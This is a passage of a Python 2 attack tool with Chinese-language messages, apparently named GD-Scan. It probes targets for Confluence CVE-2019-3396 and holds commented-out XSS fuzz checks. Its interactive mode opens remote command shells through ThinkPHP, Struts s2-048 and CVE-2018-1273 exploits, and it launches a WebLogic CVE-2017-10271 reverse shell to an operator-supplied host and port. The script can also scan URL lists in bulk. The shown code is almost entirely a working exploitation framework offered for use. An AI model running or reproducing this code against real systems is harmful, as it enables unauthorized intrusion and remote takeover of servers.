            "Content-Type": "application/json; charset=utf-8"
        }
            req = requests.post(url.scheme+'://'+url.netloc + "/rest/tinymce/1/macro/preview", headers=headers_3396, data=self.poc['Atlassian Confluence(CVE-2019-3396)'], timeout=TMOUT, verify=False)
            #print req.text
            if req.status_code == 200 and "</web-app>" in req.text:
                cprint("目标存在Atlassian Confluence(CVE-2019-3396)漏洞..", "red")
                filecontent.writelines("Atlassian Confluence(CVE-2019-3396)!!!\n")
            else:
                cprint("目标不存在Atlassian Confluence(CVE-2019-3396)漏洞..", "green")
        except Exception as e:
            cprint("检测Atlassian Confluence(CVE-2019-3396)超时..", "cyan")
            print "超时原因: ", e           
                        
#            
#        try: 
#            print self.jsonp_replacer(self.owasp['xss'][0])           
#            req = requests.get(self.jsonp_replacer(self.owasp['xss']), headers=headers, timeout=TMOUT, verify=False)
#            print req.text
#            try:
#                if r"<h1>FuZz" in req.text:
#                    cprint("目标存在xss..", "red")
#                    filecontent.writelines("xss success!!!\n")
#                else:
#                    cprint("目标不存在xss漏洞..", "green")
#            except:
#                pass
#        except Exception as e:
#            cprint("检测xss超时..", "cyan")
#            print "超时原因: ", e                    
#        try: 
#            cookits={"ut":"3JTMDRY3RGYN9DAWKCQAYB7NF3T15KN11Q1B74FF"}     
#            req = requests.get(self.url_replacer("<h1>FuZz</h1>"), headers=headers,cookies=cookits, timeout=TMOUT, verify=False)
#            print req.text
#            try:
#                if r"<h1>FuZz" in req.text:
#                    cprint("目标存在xss..", "red")
#                    filecontent.writelines("xss success!!!\n")
#                else:
#                    cprint("目标不存在xss漏洞..", "green")
#            except:
#                pass
#        except Exception as e:
#            cprint("检测xss超时..", "cyan")
#            print "超时原因: ", e                    
#            
            
            
    def banner(self):
        cprint('''
      ______    ____       ____                  
     /         |    \     / ___|  ___ __ _ _ __  
    /     ___  |     \____\___ \ / __/ _` | '_ \ 
    |       |  |     /_____|__) | (_| (_| | | | |
    \_______|  |____/     |____/ \___\__,_|_| |_|
                                        Code by GD.
            ''', 'cyan')
    
    def inShell(self, pocname):
        
        cprint("-------cve 交互式shell--------\n目标url:"+self.url, "cyan")
        prompt = "shell >>"
        if pocname == "Weblogic(CVE-2017-10271)":
          command = raw_input('输入反弹shell的主机>> ')
          command1 = raw_input('输入反弹shell的端口>> ')
          try:          
                
                data1=self.shell[pocname].replace("FUZZINGCOMMAND1", command)
                data2=data1.replace("FUZZINGCOMMAND2", command1)
                #print data2
                req = requests.post(self.url+"/wls-wsat/CoordinatorPortType",data=data2, headers=headers1, timeout=TMOUT, verify=False)
                print "success"
          except:
                cprint("命令执行失败!!!", "red")
        
        
        else:
            while True:
                print prompt,
                command = raw_input()
                command = command.strip()
                
                if command != "exit":
                    if pocname == "cve-2018-1273":
                      
                        commurl = self.url+"/users"
                         
                    elif pocname == "thinkphp5.0.23-rce":		
                     
                        commurl = self.url+"/index.php?s=captcha"
                        
                    else:
                        commurl = self.url
                    try:
                        if pocname=="thinkphp5":
                           #print commurl+self.shell[pocname].replace("FUZZINGCOMMAND", command)
                           req = requests.get(commurl+self.shell[pocname].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                           print req.text
                        elif pocname=="s2-048":
                           req = requests.post(commurl, data=self.data_all_replacer(self.shell[pocname].replace("FUZZINGCOMMAND", command)), headers=headers, timeout=TMOUT, verify=False)
                           print req.text
                        else:
                           #print self.shell[pocname].replace("FUZZINGCOMMAND", command)
                           req = requests.post(commurl, data=self.shell[pocname].replace("FUZZINGCOMMAND", command), headers=headers, timeout=TMOUT, verify=False)
                           print req.text
                    except:
                        cprint("命令执行失败!!!", "red")
                        
                        		
                    		
                    		
                else:
                    sys.exit(1)
        
     
if __name__ == "__main__":
    filecontent = open("success.txt", "a+")
    try:
        if sys.argv[1] == "-f":            
            with open(sys.argv[2]) as f:
                for line in f.readlines():
                    line = line.strip()
                    cveVuln = cve_verify(line)
                    cveVuln.scan()
        elif sys.argv[1] == "-u" and sys.argv[3] == "-i":            
            cveVuln = cve_verify(sys.argv[2].strip())
            cveVuln.banner()
            cveVuln.inShell(sys.argv[4].strip())
        elif sys.argv[1] == "-u" and sys.argv[3] == "-fuzz":            
            cveVuln = cve_verify(sys.argv[2].strip())
            cveVuln.data=sys.argv[4].strip()
            cveVuln.banner()
            cveVuln.scan()
        elif sys.argv[1] == "-u" and sys.argv[3] == "-data" and sys.argv[5]=='-p':            
            cveVuln = cve_verify(sys.argv[2].strip()) 
            cveVuln.data=sys.argv[4].strip()
            cveVuln.param=sys.argv[6].strip()     
            cveVuln.banner()
            cveVuln.scan()
#        elif sys.argv[2] == "-p":
#            cveVuln = cve_verify(sys.argv[2].strip()) 
#            cveVuln.param=sys.argv[3].strip()     
#            cveVuln.banner()
#            cveVuln.scan()                                    
        else:
            
            cveVuln = cve_verify(sys.argv[1].strip())    
            cveVuln.banner()        
            cveVuln.scan()
    except Exception as e:
        print e
        
        print '''Usage: python  gd_sacn.py  " http://www.waitalone.cn/a/b/c/index.php?id=aa&abc=456&xxx=ooo" 对目标url扫描cve'''
        print '''       python -f xxx.txt 批量扫cve'''
        print '''       python -u  "http://www.waitalone.cn/a/b/c/index.php?id=aa&abc=456&xxx=ooo"  -fuzz "post=aa&post2=bb  对post包的所有参数进行fuzz扫描cve'''
        print '''       python  -u  "http://www.waitalone.cn/a/b/c/index.php?id=aa&abc=456&xxx=ooo" -data "post=aa&post2=bb" -p post           对特定post包的参数post进行fuzz扫描cve'''
    

